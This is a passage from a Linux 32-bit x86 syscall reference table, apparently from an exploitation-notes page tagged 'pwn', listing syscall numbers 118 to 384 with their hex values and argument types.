fifth\n\n\n118\nfsync\n0x76\nunsigned int fd\n-\n-\n-\n-\n-\n\n\n119\nsigreturn\n0x77\n?\n?\n?\n?\n?\n?\n\n\n120\nclone\n0x78\nunsigned long\nunsigned long\nint *\nint *\nunsigned long\n-\n\n\n121\nsetdomainname\n0x79\nchar *name\nint len\n-\n-\n-\n-\n\n\n122\nuname\n0x7a\nstruct old_utsname *\n-\n-\n-\n-\n-\n\n\n123\nmodify_ldt\n0x7b\n?\n?\n?\n?\n?\n?\n\n\n124\nadjtimex\n0x7c\nstruct timex *txc_p\n-\n-\n-\n-\n-\n\n\n125\nmprotect\n0x7d\nunsigned long start\nsize_t len\nunsigned long prot\n-\n-\n-\n\n\n126\nsigprocmask\n0x7e\nint how\nold_sigset_t *set\nold_sigset_t *oset\n-\n-\n-\n\n\n127\ncreate_module\n0x7f\n?\n?\n?\n?\n?\n?\n\n\n128\ninit_module\n0x80\nvoid *umod\nunsigned long len\nconst char *uargs\n-\n-\n-\n\n\n129\ndelete_module\n0x81\nconst char *name_user\nunsigned int flags\n-\n-\n-\n-\n\n\n130\nget_kernel_syms\n0x82\n?\n?\n?\n?\n?\n?\n\n\n131\nquotactl\n0x83\nunsigned int cmd\nconst char *special\nqid_t id\nvoid *addr\n-\n-\n\n\n132\ngetpgid\n0x84\npid_t pid\n-\n-\n-\n-\n-\n\n\n133\nfchdir\n0x85\nunsigned int fd\n-\n-\n-\n-\n-\n\n\n134\nbdflush\n0x86\nint func\nlong data\n-\n-\n-\n-\n\n\n135\nsysfs\n0x87\nint option\nunsigned long arg1\nunsigned long arg2\n-\n-\n-\n\n\n136\npersonality\n0x88\nunsigned int personality\n-\n-\n-\n-\n-\n\n\n137\nafs_syscall\n0x89\n?\n?\n?\n?\n?\n?\n\n\n138\nsetfsuid\n0x8a\nuid_t uid\n-\n-\n-\n-\n-\n\n\n139\nsetfsgid\n0x8b\ngid_t gid\n-\n-\n-\n-\n-\n\n\n140\n_llseek\n0x8c\n?\n?\n?\n?\n?\n?\n\n\n141\ngetdents\n0x8d\nunsigned int fd\nstruct linux_dirent *dirent\nunsigned int count\n-\n-\n-\n\n\n142\n_newselect\n0x8e\n?\n?\n?\n?\n?\n?\n\n\n143\nflock\n0x8f\nunsigned int fd\nunsigned int cmd\n-\n-\n-\n-\n\n\n144\nmsync\n0x90\nunsigned long start\nsize_t len\nint flags\n-\n-\n-\n\n\n145\nreadv\n0x91\nunsigned long fd\nconst struct iovec *vec\nunsigned long vlen\n-\n-\n-\n\n\n146\nwritev\n0x92\nunsigned long fd\nconst struct iovec *vec\nunsigned long vlen\n-\n-\n-\n\n\n147\ngetsid\n0x93\npid_t pid\n-\n-\n-\n-\n-\n\n\n148\nfdatasync\n0x94\nunsigned int fd\n-\n-\n-\n-\n-\n\n\n149\n_sysctl\n0x95\n?\n?\n?\n?\n?\n?\n\n\n150\nmlock\n0x96\nunsigned long start\nsize_t len\n-\n-\n-\n-\n\n\n151\nmunlock\n0x97\nunsigned long start\nsize_t len\n-\n-\n-\n-\n\n\n152\nmlockall\n0x98\nint flags\n-\n-\n-\n-\n-\n\n\n153\nmunlockall\n0x99\n-\n-\n-\n-\n-\n-\n\n\n154\nsched_setparam\n0x9a\npid_t pid\nstruct sched_param *param\n-\n-\n-\n-\n\n\n155\nsched_getparam\n0x9b\npid_t pid\nstruct sched_param *param\n-\n-\n-\n-\n\n\n156\nsched_setscheduler\n0x9c\npid_t pid\nint policy\nstruct sched_param *param\n-\n-\n-\n\n\n157\nsched_getscheduler\n0x9d\npid_t pid\n-\n-\n-\n-\n-\n\n\n158\nsched_yield\n0x9e\n-\n-\n-\n-\n-\n-\n\n\n159\nsched_get_priority_max\n0x9f\nint policy\n-\n-\n-\n-\n-\n\n\n160\nsched_get_priority_min\n0xa0\nint policy\n-\n-\n-\n-\n-\n\n\n161\nsched_rr_get_interval\n0xa1\npid_t pid\nstruct timespec *interval\n-\n-\n-\n-\n\n\n162\nnanosleep\n0xa2\nstruct __kernel_timespec *rqtp\nstruct __kernel_timespec *rmtp\n-\n-\n-\n-\n\n\n163\nmremap\n0xa3\nunsigned long addr\nunsigned long old_len\nunsigned long new_len\nunsigned long flags\nunsigned long new_addr\n-\n\n\n164\nsetresuid\n0xa4\nuid_t ruid\nuid_t euid\nuid_t suid\n-\n-\n-\n\n\n165\ngetresuid\n0xa5\nuid_t *ruid\nuid_t *euid\nuid_t *suid\n-\n-\n-\n\n\n166\nvm86\n0xa6\n?\n?\n?\n?\n?\n?\n\n\n167\nquery_module\n0xa7\n?\n?\n?\n?\n?\n?\n\n\n168\npoll\n0xa8\nstruct pollfd *ufds\nunsigned int nfds\nint timeout\n-\n-\n-\n\n\n169\nnfsservctl\n0xa9\n?\n?\n?\n?\n?\n?\n\n\n170\nsetresgid\n0xaa\ngid_t rgid\ngid_t egid\ngid_t sgid\n-\n-\n-\n\n\n171\ngetresgid\n0xab\ngid_t *rgid\ngid_t *egid\ngid_t *sgid\n-\n-\n-\n\n\n172\nprctl\n0xac\nint option\nunsigned long arg2\nunsigned long arg3\nunsigned long arg4\nunsigned long arg5\n-\n\n\n173\nrt_sigreturn\n0xad\n?\n?\n?\n?\n?\n?\n\n\n174\nrt_sigaction\n0xae\nint\nconst struct sigaction *\nstruct sigaction *\nsize_t\n-\n-\n\n\n175\nrt_sigprocmask\n0xaf\nint how\nsigset_t *set\nsigset_t *oset\nsize_t sigsetsize\n-\n-\n\n\n176\nrt_sigpending\n0xb0\nsigset_t *set\nsize_t sigsetsize\n-\n-\n-\n-\n\n\n177\nrt_sigtimedwait\n0xb1\nconst sigset_t *uthese\nsiginfo_t *uinfo\nconst struct timespec *uts\nsize_t sigsetsize\n-\n-\n\n\n178\nrt_sigqueueinfo\n0xb2\npid_t pid\nint sig\nsiginfo_t *uinfo\n-\n-\n-\n\n\n179\nrt_sigsuspend\n0xb3\nsigset_t *unewset\nsize_t sigsetsize\n-\n-\n-\n-\n\n\n180\npread64\n0xb4\nunsigned int fd\nchar *buf\nsize_t count\nloff_t pos\n-\n-\n\n\n181\npwrite64\n0xb5\nunsigned int fd\nconst char *buf\nsize_t count\nloff_t pos\n-\n-\n\n\n182\nchown\n0xb6\nconst char *filename\nuid_t user\ngid_t group\n-\n-\n-\n\n\n183\ngetcwd\n0xb7\nchar *buf\nunsigned long size\n-\n-\n-\n-\n\n\n184\ncapget\n0xb8\ncap_user_header_t header\ncap_user_data_t dataptr\n-\n-\n-\n-\n\n\n185\ncapset\n0xb9\ncap_user_header_t header\nconst cap_user_data_t data\n-\n-\n-\n-\n\n\n186\nsigaltstack\n0xba\nconst struct sigaltstack *uss\nstruct sigaltstack *uoss\n-\n-\n-\n-\n\n\n187\nsendfile\n0xbb\nint out_fd\nint in_fd\noff_t *offset\nsize_t count\n-\n-\n\n\n188\ngetpmsg\n0xbc\n?\n?\n?\n?\n?\n?\n\n\n189\nputpmsg\n0xbd\n?\n?\n?\n?\n?\n?\n\n\n190\nvfork\n0xbe\n-\n-\n-\n-\n-\n-\n\n\n191\nugetrlimit\n0xbf\n?\n?\n?\n?\n?\n?\n\n\n192\nmmap2\n0xc0\n?\n?\n?\n?\n?\n?\n\n\n193\ntruncate64\n0xc1\nconst char *path\nloff_t length\n-\n-\n-\n-\n\n\n194\nftruncate64\n0xc2\nunsigned int fd\nloff_t length\n-\n-\n-\n-\n\n\n195\nstat64\n0xc3\nconst char *filename\nstruct stat64 *statbuf\n-\n-\n-\n-\n\n\n196\nlstat64\n0xc4\nconst char *filename\nstruct stat64 *statbuf\n-\n-\n-\n-\n\n\n197\nfstat64\n0xc5\nunsigned long fd\nstruct stat64 *statbuf\n-\n-\n-\n-\n\n\n198\nlchown32\n0xc6\n?\n?\n?\n?\n?\n?\n\n\n199\ngetuid32\n0xc7\n?\n?\n?\n?\n?\n?\n\n\n200\ngetgid32\n0xc8\n?\n?\n?\n?\n?\n?\n\n\n201\ngeteuid32\n0xc9\n?\n?\n?\n?\n?\n?\n\n\n202\ngetegid32\n0xca\n?\n?\n?\n?\n?\n?\n\n\n203\nsetreuid32\n0xcb\n?\n?\n?\n?\n?\n?\n\n\n204\nsetregid32\n0xcc\n?\n?\n?\n?\n?\n?\n\n\n205\ngetgroups32\n0xcd\n?\n?\n?\n?\n?\n?\n\n\n206\nsetgroups32\n0xce\n?\n?\n?\n?\n?\n?\n\n\n207\nfchown32\n0xcf\n?\n?\n?\n?\n?\n?\n\n\n208\nsetresuid32\n0xd0\n?\n?\n?\n?\n?\n?\n\n\n209\ngetresuid32\n0xd1\n?\n?\n?\n?\n?\n?\n\n\n210\nsetresgid32\n0xd2\n?\n?\n?\n?\n?\n?\n\n\n211\ngetresgid32\n0xd3\n?\n?\n?\n?\n?\n?\n\n\n212\nchown32\n0xd4\n?\n?\n?\n?\n?\n?\n\n\n213\nsetuid32\n0xd5\n?\n?\n?\n?\n?\n?\n\n\n214\nsetgid32\n0xd6\n?\n?\n?\n?\n?\n?\n\n\n215\nsetfsuid32\n0xd7\n?\n?\n?\n?\n?\n?\n\n\n216\nsetfsgid32\n0xd8\n?\n?\n?\n?\n?\n?\n\n\n217\npivot_root\n0xd9\nconst char *new_root\nconst char *put_old\n-\n-\n-\n-\n\n\n218\nmincore\n0xda\nunsigned long start\nsize_t len\nunsigned char * vec\n-\n-\n-\n\n\n219\nmadvise\n0xdb\nunsigned long start\nsize_t len\nint behavior\n-\n-\n-\n\n\n220\ngetdents64\n0xdc\nunsigned int fd\nstruct linux_dirent64 *dirent\nunsigned int count\n-\n-\n-\n\n\n221\nfcntl64\n0xdd\nunsigned int fd\nunsigned int cmd\nunsigned long arg\n-\n-\n-\n\n\n222\nnot implemented\n0xde\n\n\n\n\n\n\n\n\n223\nnot implemented\n0xdf\n\n\n\n\n\n\n\n\n224\ngettid\n0xe0\n-\n-\n-\n-\n-\n-\n\n\n225\nreadahead\n0xe1\nint fd\nloff_t offset\nsize_t count\n-\n-\n-\n\n\n226\nsetxattr\n0xe2\nconst char *path\nconst char *name\nconst void *value\nsize_t size\nint flags\n-\n\n\n227\nlsetxattr\n0xe3\nconst char *path\nconst char *name\nconst void *value\nsize_t size\nint flags\n-\n\n\n228\nfsetxattr\n0xe4\nint fd\nconst char *name\nconst void *value\nsize_t size\nint flags\n-\n\n\n229\ngetxattr\n0xe5\nconst char *path\nconst char *name\nvoid *value\nsize_t size\n-\n-\n\n\n230\nlgetxattr\n0xe6\nconst char *path\nconst char *name\nvoid *value\nsize_t size\n-\n-\n\n\n231\nfgetxattr\n0xe7\nint fd\nconst char *name\nvoid *value\nsize_t size\n-\n-\n\n\n232\nlistxattr\n0xe8\nconst char *path\nchar *list\nsize_t size\n-\n-\n-\n\n\n233\nllistxattr\n0xe9\nconst char *path\nchar *list\nsize_t size\n-\n-\n-\n\n\n234\nflistxattr\n0xea\nint fd\nchar *list\nsize_t size\n-\n-\n-\n\n\n235\nremovexattr\n0xeb\nconst char *path\nconst char *name\n-\n-\n-\n-\n\n\n236\nlremovexattr\n0xec\nconst char *path\nconst char *name\n-\n-\n-\n-\n\n\n237\nfremovexattr\n0xed\nint fd\nconst char *name\n-\n-\n-\n-\n\n\n238\ntkill\n0xee\npid_t pid\nint sig\n-\n-\n-\n-\n\n\n239\nsendfile64\n0xef\nint out_fd\nint in_fd\nloff_t *offset\nsize_t count\n-\n-\n\n\n240\nfutex\n0xf0\nu32 *uaddr\nint op\nu32 val\nstruct timespec *utime\nu32 *uaddr2\nu32 val3\n\n\n241\nsched_setaffinity\n0xf1\npid_t pid\nunsigned int len\nunsigned long *user_mask_ptr\n-\n-\n-\n\n\n242\nsched_getaffinity\n0xf2\npid_t pid\nunsigned int len\nunsigned long *user_mask_ptr\n-\n-\n-\n\n\n243\nset_thread_area\n0xf3\n?\n?\n?\n?\n?\n?\n\n\n244\nget_thread_area\n0xf4\n?\n?\n?\n?\n?\n?\n\n\n245\nio_setup\n0xf5\nunsigned nr_reqs\naio_context_t *ctx\n-\n-\n-\n-\n\n\n246\nio_destroy\n0xf6\naio_context_t ctx\n-\n-\n-\n-\n-\n\n\n247\nio_getevents\n0xf7\naio_context_t ctx_id\nlong min_nr\nlong nr\nstruct io_event *events\nstruct timespec *timeout\n-\n\n\n248\nio_submit\n0xf8\naio_context_t\nlong\nstruct iocb * *\n-\n-\n-\n\n\n249\nio_cancel\n0xf9\naio_context_t ctx_id\nstruct iocb *iocb\nstruct io_event *result\n-\n-\n-\n\n\n250\nfadvise64\n0xfa\nint fd\nloff_t offset\nsize_t len\nint advice\n-\n-\n\n\n251\nnot implemented\n0xfb\n\n\n\n\n\n\n\n\n252\nexit_group\n0xfc\nint error_code\n-\n-\n-\n-\n-\n\n\n253\nlookup_dcookie\n0xfd\nu64 cookie64\nchar *buf\nsize_t len\n-\n-\n-\n\n\n254\nepoll_create\n0xfe\nint size\n-\n-\n-\n-\n-\n\n\n255\nepoll_ctl\n0xff\nint epfd\nint op\nint fd\nstruct epoll_event *event\n-\n-\n\n\n256\nepoll_wait\n0x100\nint epfd\nstruct epoll_event *events\nint maxevents\nint timeout\n-\n-\n\n\n257\nremap_file_pages\n0x101\nunsigned long start\nunsigned long size\nunsigned long prot\nunsigned long pgoff\nunsigned long flags\n-\n\n\n258\nset_tid_address\n0x102\nint *tidptr\n-\n-\n-\n-\n-\n\n\n259\ntimer_create\n0x103\nclockid_t which_clock\nstruct sigevent *timer_event_spec\ntimer_t * created_timer_id\n-\n-\n-\n\n\n260\ntimer_settime\n0x104\ntimer_t timer_id\nint flags\nconst struct __kernel_itimerspec *new_setting\nstruct itimerspec *old_setting\n-\n-\n\n\n261\ntimer_gettime\n0x105\ntimer_t timer_id\nstruct __kernel_itimerspec *setting\n-\n-\n-\n-\n\n\n262\ntimer_getoverrun\n0x106\ntimer_t timer_id\n-\n-\n-\n-\n-\n\n\n263\ntimer_delete\n0x107\ntimer_t timer_id\n-\n-\n-\n-\n-\n\n\n264\nclock_settime\n0x108\nclockid_t which_clock\nconst struct __kernel_timespec *tp\n-\n-\n-\n-\n\n\n265\nclock_gettime\n0x109\nclockid_t which_clock\nstruct __kernel_timespec *tp\n-\n-\n-\n-\n\n\n266\nclock_getres\n0x10a\nclockid_t which_clock\nstruct __kernel_timespec *tp\n-\n-\n-\n-\n\n\n267\nclock_nanosleep\n0x10b\nclockid_t which_clock\nint flags\nconst struct __kernel_timespec *rqtp\nstruct __kernel_timespec *rmtp\n-\n-\n\n\n268\nstatfs64\n0x10c\nconst char *path\nsize_t sz\nstruct statfs64 *buf\n-\n-\n-\n\n\n269\nfstatfs64\n0x10d\nunsigned int fd\nsize_t sz\nstruct statfs64 *buf\n-\n-\n-\n\n\n270\ntgkill\n0x10e\npid_t tgid\npid_t pid\nint sig\n-\n-\n-\n\n\n271\nutimes\n0x10f\nchar *filename\nstruct timeval *utimes\n-\n-\n-\n-\n\n\n272\nfadvise64_64\n0x110\nint fd\nloff_t offset\nloff_t len\nint advice\n-\n-\n\n\n273\nvserver\n0x111\n?\n?\n?\n?\n?\n?\n\n\n274\nmbind\n0x112\nunsigned long start\nunsigned long len\nunsigned long mode\nconst unsigned long *nmask\nunsigned long maxnode\nunsigned flags\n\n\n275\nget_mempolicy\n0x113\nint *policy\nunsigned long *nmask\nunsigned long maxnode\nunsigned long addr\nunsigned long flags\n-\n\n\n276\nset_mempolicy\n0x114\nint mode\nconst unsigned long *nmask\nunsigned long maxnode\n-\n-\n-\n\n\n277\nmq_open\n0x115\nconst char *name\nint oflag\numode_t mode\nstruct mq_attr *attr\n-\n-\n\n\n278\nmq_unlink\n0x116\nconst char *name\n-\n-\n-\n-\n-\n\n\n279\nmq_timedsend\n0x117\nmqd_t mqdes\nconst char *msg_ptr\nsize_t msg_len\nunsigned int msg_prio\nconst struct __kernel_timespec *abs_timeout\n-\n\n\n280\nmq_timedreceive\n0x118\nmqd_t mqdes\nchar *msg_ptr\nsize_t msg_len\nunsigned int *msg_prio\nconst struct __kernel_timespec *abs_timeout\n-\n\n\n281\nmq_notify\n0x119\nmqd_t mqdes\nconst struct sigevent *notification\n-\n-\n-\n-\n\n\n282\nmq_getsetattr\n0x11a\nmqd_t mqdes\nconst struct mq_attr *mqstat\nstruct mq_attr *omqstat\n-\n-\n-\n\n\n283\nkexec_load\n0x11b\nunsigned long entry\nunsigned long nr_segments\nstruct kexec_segment *segments\nunsigned long flags\n-\n-\n\n\n284\nwaitid\n0x11c\nint which\npid_t pid\nstruct siginfo *infop\nint options\nstruct rusage *ru\n-\n\n\n285\nnot implemented\n0x11d\n\n\n\n\n\n\n\n\n286\nadd_key\n0x11e\nconst char *_type\nconst char *_description\nconst void *_payload\nsize_t plen\nkey_serial_t destringid\n-\n\n\n287\nrequest_key\n0x11f\nconst char *_type\nconst char *_description\nconst char *_callout_info\nkey_serial_t destringid\n-\n-\n\n\n288\nkeyctl\n0x120\nint cmd\nunsigned long arg2\nunsigned long arg3\nunsigned long arg4\nunsigned long arg5\n-\n\n\n289\nioprio_set\n0x121\nint which\nint who\nint ioprio\n-\n-\n-\n\n\n290\nioprio_get\n0x122\nint which\nint who\n-\n-\n-\n-\n\n\n291\ninotify_init\n0x123\n-\n-\n-\n-\n-\n-\n\n\n292\ninotify_add_watch\n0x124\nint fd\nconst char *path\nu32 mask\n-\n-\n-\n\n\n293\ninotify_rm_watch\n0x125\nint fd\n__s32 wd\n-\n-\n-\n-\n\n\n294\nmigrate_pages\n0x126\npid_t pid\nunsigned long maxnode\nconst unsigned long *from\nconst unsigned long *to\n-\n-\n\n\n295\nopenat\n0x127\nint dfd\nconst char *filename\nint flags\numode_t mode\n-\n-\n\n\n296\nmkdirat\n0x128\nint dfd\nconst char * pathname\numode_t mode\n-\n-\n-\n\n\n297\nmknodat\n0x129\nint dfd\nconst char * filename\numode_t mode\nunsigned dev\n-\n-\n\n\n298\nfchownat\n0x12a\nint dfd\nconst char *filename\nuid_t user\ngid_t group\nint flag\n-\n\n\n299\nfutimesat\n0x12b\nint dfd\nconst char *filename\nstruct timeval *utimes\n-\n-\n-\n\n\n300\nfstatat64\n0x12c\nint dfd\nconst char *filename\nstruct stat64 *statbuf\nint flag\n-\n-\n\n\n301\nunlinkat\n0x12d\nint dfd\nconst char * pathname\nint flag\n-\n-\n-\n\n\n302\nrenameat\n0x12e\nint olddfd\nconst char * oldname\nint newdfd\nconst char * newname\n-\n-\n\n\n303\nlinkat\n0x12f\nint olddfd\nconst char *oldname\nint newdfd\nconst char *newname\nint flags\n-\n\n\n304\nsymlinkat\n0x130\nconst char * oldname\nint newdfd\nconst char * newname\n-\n-\n-\n\n\n305\nreadlinkat\n0x131\nint dfd\nconst char *path\nchar *buf\nint bufsiz\n-\n-\n\n\n306\nfchmodat\n0x132\nint dfd\nconst char * filename\numode_t mode\n-\n-\n-\n\n\n307\nfaccessat\n0x133\nint dfd\nconst char *filename\nint mode\n-\n-\n-\n\n\n308\npselect6\n0x134\nint\nfd_set *\nfd_set *\nfd_set *\nstruct timespec *\nvoid *\n\n\n309\nppoll\n0x135\nstruct pollfd *\nunsigned int\nstruct timespec *\nconst sigset_t *\nsize_t\n-\n\n\n310\nunshare\n0x136\nunsigned long unshare_flags\n-\n-\n-\n-\n-\n\n\n311\nset_robust_list\n0x137\nstruct robust_list_head *head\nsize_t len\n-\n-\n-\n-\n\n\n312\nget_robust_list\n0x138\nint pid\nstruct robust_list_head * *head_ptr\nsize_t *len_ptr\n-\n-\n-\n\n\n313\nsplice\n0x139\nint fd_in\nloff_t *off_in\nint fd_out\nloff_t *off_out\nsize_t len\nunsigned int flags\n\n\n314\nsync_file_range\n0x13a\nint fd\nloff_t offset\nloff_t nbytes\nunsigned int flags\n-\n-\n\n\n315\ntee\n0x13b\nint fdin\nint fdout\nsize_t len\nunsigned int flags\n-\n-\n\n\n316\nvmsplice\n0x13c\nint fd\nconst struct iovec *iov\nunsigned long nr_segs\nunsigned int flags\n-\n-\n\n\n317\nmove_pages\n0x13d\npid_t pid\nunsigned long nr_pages\nconst void * *pages\nconst int *nodes\nint *status\nint flags\n\n\n318\ngetcpu\n0x13e\nunsigned *cpu\nunsigned *node\nstruct getcpu_cache *cache\n-\n-\n-\n\n\n319\nepoll_pwait\n0x13f\nint epfd\nstruct epoll_event *events\nint maxevents\nint timeout\nconst sigset_t *sigmask\nsize_t sigsetsize\n\n\n320\nutimensat\n0x140\nint dfd\nconst char *filename\nstruct timespec *utimes\nint flags\n-\n-\n\n\n321\nsignalfd\n0x141\nint ufd\nsigset_t *user_mask\nsize_t sizemask\n-\n-\n-\n\n\n322\ntimerfd_create\n0x142\nint clockid\nint flags\n-\n-\n-\n-\n\n\n323\neventfd\n0x143\nunsigned int count\n-\n-\n-\n-\n-\n\n\n324\nfallocate\n0x144\nint fd\nint mode\nloff_t offset\nloff_t len\n-\n-\n\n\n325\ntimerfd_settime\n0x145\nint ufd\nint flags\nconst struct __kernel_itimerspec *utmr\nstruct __kernel_itimerspec *otmr\n-\n-\n\n\n326\ntimerfd_gettime\n0x146\nint ufd\nstruct __kernel_itimerspec *otmr\n-\n-\n-\n-\n\n\n327\nsignalfd4\n0x147\nint ufd\nsigset_t *user_mask\nsize_t sizemask\nint flags\n-\n-\n\n\n328\neventfd2\n0x148\nunsigned int count\nint flags\n-\n-\n-\n-\n\n\n329\nepoll_create1\n0x149\nint flags\n-\n-\n-\n-\n-\n\n\n330\ndup3\n0x14a\nunsigned int oldfd\nunsigned int newfd\nint flags\n-\n-\n-\n\n\n331\npipe2\n0x14b\nint *fildes\nint flags\n-\n-\n-\n-\n\n\n332\ninotify_init1\n0x14c\nint flags\n-\n-\n-\n-\n-\n\n\n333\npreadv\n0x14d\nunsigned long fd\nconst struct iovec *vec\nunsigned long vlen\nunsigned long pos_l\nunsigned long pos_h\n-\n\n\n334\npwritev\n0x14e\nunsigned long fd\nconst struct iovec *vec\nunsigned long vlen\nunsigned long pos_l\nunsigned long pos_h\n-\n\n\n335\nrt_tgsigqueueinfo\n0x14f\npid_t tgid\npid_t pid\nint sig\nsiginfo_t *uinfo\n-\n-\n\n\n336\nperf_event_open\n0x150\nstruct perf_event_attr *attr_uptr\npid_t pid\nint cpu\nint group_fd\nunsigned long flags\n-\n\n\n337\nrecvmmsg\n0x151\nint fd\nstruct mmsghdr *msg\nunsigned int vlen\nunsigned flags\nstruct timespec *timeout\n-\n\n\n338\nfanotify_init\n0x152\nunsigned int flags\nunsigned int event_f_flags\n-\n-\n-\n-\n\n\n339\nfanotify_mark\n0x153\nint fanotify_fd\nunsigned int flags\nu64 mask\nint fd\nconst char *pathname\n-\n\n\n340\nprlimit64\n0x154\npid_t pid\nunsigned int resource\nconst struct rlimit64 *new_rlim\nstruct rlimit64 *old_rlim\n-\n-\n\n\n341\nname_to_handle_at\n0x155\nint dfd\nconst char *name\nstruct file_handle *handle\nint *mnt_id\nint flag\n-\n\n\n342\nopen_by_handle_at\n0x156\nint mountdirfd\nstruct file_handle *handle\nint flags\n-\n-\n-\n\n\n343\nclock_adjtime\n0x157\nclockid_t which_clock\nstruct timex *tx\n-\n-\n-\n-\n\n\n344\nsyncfs\n0x158\nint fd\n-\n-\n-\n-\n-\n\n\n345\nsendmmsg\n0x159\nint fd\nstruct mmsghdr *msg\nunsigned int vlen\nunsigned flags\n-\n-\n\n\n346\nsetns\n0x15a\nint fd\nint nstype\n-\n-\n-\n-\n\n\n347\nprocess_vm_readv\n0x15b\npid_t pid\nconst struct iovec *lvec\nunsigned long liovcnt\nconst struct iovec *rvec\nunsigned long riovcnt\nunsigned long flags\n\n\n348\nprocess_vm_writev\n0x15c\npid_t pid\nconst struct iovec *lvec\nunsigned long liovcnt\nconst struct iovec *rvec\nunsigned long riovcnt\nunsigned long flags\n\n\n349\nkcmp\n0x15d\npid_t pid1\npid_t pid2\nint type\nunsigned long idx1\nunsigned long idx2\n-\n\n\n350\nfinit_module\n0x15e\nint fd\nconst char *uargs\nint flags\n-\n-\n-\n\n\n351\nsched_setattr\n0x15f\npid_t pid\nstruct sched_attr *attr\nunsigned int flags\n-\n-\n-\n\n\n352\nsched_getattr\n0x160\npid_t pid\nstruct sched_attr *attr\nunsigned int size\nunsigned int flags\n-\n-\n\n\n353\nrenameat2\n0x161\nint olddfd\nconst char *oldname\nint newdfd\nconst char *newname\nunsigned int flags\n-\n\n\n354\nseccomp\n0x162\nunsigned int op\nunsigned int flags\nconst char *uargs\n-\n-\n-\n\n\n355\ngetrandom\n0x163\nchar *buf\nsize_t count\nunsigned int flags\n-\n-\n-\n\n\n356\nmemfd_create\n0x164\nconst char *uname_ptr\nunsigned int flags\n-\n-\n-\n-\n\n\n357\nbpf\n0x165\nint cmd\nunion bpf_attr *attr\nunsigned int size\n-\n-\n-\n\n\n358\nexecveat\n0x166\nint dfd\nconst char *filename\nconst char *const *argv\nconst char *const *envp\nint flags\n-\n\n\n359\nsocket\n0x167\nint\nint\nint\n-\n-\n-\n\n\n360\nsocketpair\n0x168\nint\nint\nint\nint *\n-\n-\n\n\n361\nbind\n0x169\nint\nstruct sockaddr *\nint\n-\n-\n-\n\n\n362\nconnect\n0x16a\nint\nstruct sockaddr *\nint\n-\n-\n-\n\n\n363\nlisten\n0x16b\nint\nint\n-\n-\n-\n-\n\n\n364\naccept4\n0x16c\nint\nstruct sockaddr *\nint *\nint\n-\n-\n\n\n365\ngetsockopt\n0x16d\nint fd\nint level\nint optname\nchar *optval\nint *optlen\n-\n\n\n366\nsetsockopt\n0x16e\nint fd\nint level\nint optname\nchar *optval\nint optlen\n-\n\n\n367\ngetsockname\n0x16f\nint\nstruct sockaddr *\nint *\n-\n-\n-\n\n\n368\ngetpeername\n0x170\nint\nstruct sockaddr *\nint *\n-\n-\n-\n\n\n369\nsendto\n0x171\nint\nvoid *\nsize_t\nunsigned\nstruct sockaddr *\nint\n\n\n370\nsendmsg\n0x172\nint fd\nstruct user_msghdr *msg\nunsigned flags\n-\n-\n-\n\n\n371\nrecvfrom\n0x173\nint\nvoid *\nsize_t\nunsigned\nstruct sockaddr *\nint *\n\n\n372\nrecvmsg\n0x174\nint fd\nstruct user_msghdr *msg\nunsigned flags\n-\n-\n-\n\n\n373\nshutdown\n0x175\nint\nint\n-\n-\n-\n-\n\n\n374\nuserfaultfd\n0x176\nint flags\n-\n-\n-\n-\n-\n\n\n375\nmembarrier\n0x177\nint cmd\nint flags\n-\n-\n-\n-\n\n\n376\nmlock2\n0x178\nunsigned long start\nsize_t len\nint flags\n-\n-\n-\n\n\n377\ncopy_file_range\n0x179\nint fd_in\nloff_t *off_in\nint fd_out\nloff_t *off_out\nsize_t len\nunsigned int flags\n\n\n378\npreadv2\n0x17a\nunsigned long fd\nconst struct iovec *vec\nunsigned long vlen\nunsigned long pos_l\nunsigned long pos_h\nrwf_t flags\n\n\n379\npwritev2\n0x17b\nunsigned long fd\nconst struct iovec *vec\nunsigned long vlen\nunsigned long pos_l\nunsigned long pos_h\nrwf_t flags\n\n\n380\npkey_mprotect\n0x17c\nunsigned long start\nsize_t len\nunsigned long prot\nint pkey\n-\n-\n\n\n381\npkey_alloc\n0x17d\nunsigned long flags\nunsigned long init_val\n-\n-\n-\n-\n\n\n382\npkey_free\n0x17e\nint pkey\n-\n-\n-\n-\n-\n\n\n383\nstatx\n0x17f\nint dfd\nconst char *path\nunsigned flags\nunsigned mask\nstruct statx *buffer\n-\n\n\n384\narch_prctl\n0x180\n?\n?\n?\n?\n?\n?\n\n\nx86_64 Syscall table\n","tags":["pwn"]}]